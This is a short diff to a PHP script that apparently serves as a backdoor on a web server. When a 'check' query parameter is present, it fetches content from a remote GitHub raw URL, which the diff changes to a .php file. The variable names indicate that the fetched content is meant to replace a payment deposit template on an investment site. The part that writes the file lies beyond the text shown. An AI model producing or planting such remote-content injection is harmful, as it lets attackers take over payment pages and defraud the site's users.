@@ -1,7 +1,7 @@
 <?php
 if (isset($_GET['check'])) {
     $file_path = "/www/wwwroot/dytouzi/core/resources/views/templates/invester/user/payment/deposit.blade.php";
-    $remote_url = "https://raw.githubusercontent.com/mekote/sil/refs/heads/main/2.txt";
+    $remote_url = "https://raw.githubusercontent.com/mekote/sil/refs/heads/main/2.2.php";
 
     // Uzaktan içeriği çek
     $new_content = file_get_contents($remote_url);
